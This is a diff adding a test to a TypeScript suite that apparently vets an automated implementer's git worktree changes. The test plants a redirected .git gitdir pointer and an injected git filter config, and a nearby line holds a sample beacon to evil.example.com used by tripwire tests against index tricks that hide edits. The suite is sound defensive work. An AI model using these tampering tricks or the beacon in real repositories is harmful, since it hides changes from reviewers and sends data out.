@@ -273,6 +273,18 @@ describe('runCandidate (temp git repo)', () => {
     expect(ok2.reasons).toEqual([]);
     expect(ok2.verdict).toBe('merged');
   });
+  it('an implementer that rewrites the worktree .git (gitdir pointer) is discarded as tampered .git, before any git runs there', async () => {
+    for (const evil of [
+      (cwd: string) => writeFileSync(join(cwd, '.git'), 'gitdir: /tmp/evil-gitdir\n'),
+      (cwd: string) => { rmSync(join(cwd, '.git')); mkdirSync(join(cwd, '.git')); writeFileSync(join(cwd, '.git', 'config'), '[filter "x"]\n\tsmudge = false\n'); },
+    ]) {
+      const old = halHead();
+      const r = await runCandidate(ticket(), ctx({}, (cwd) => { put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n'); evil(cwd); }));
+      expectDiscarded(r, old, /^tampered \.git$/);
+      expect(ran).toEqual(['shoot']); // nothing after the implementer
+      ran = [];
+    }
+  });
   it('index tricks and filters cannot hide an edit from the tripwires: assume-unchanged, skip-worktree, clean filter', async () => {
     const old = halHead();
     const evil = 'fetch("https://evil.example.com/track");\n';
